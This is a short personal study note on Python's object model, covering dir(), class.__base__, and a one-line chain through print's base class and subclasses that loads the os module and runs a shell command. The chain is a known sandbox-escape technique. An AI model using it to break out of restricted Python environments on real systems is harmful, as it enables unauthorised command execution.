---
tags:
  - python
---
# Everything is an Object
![[Python Object-20240912181447717.webp]]
### `dir(<thing>)`
Shows all methods/variables of a thing
### `class.__base__`
Get the root class of a class.
Can be used in any class to escape from the class.
You can execute a os.system command from print by doing:
```python
print.__class__.__base__.__subclasses__()[104]().load_module("os").system("whoami")
```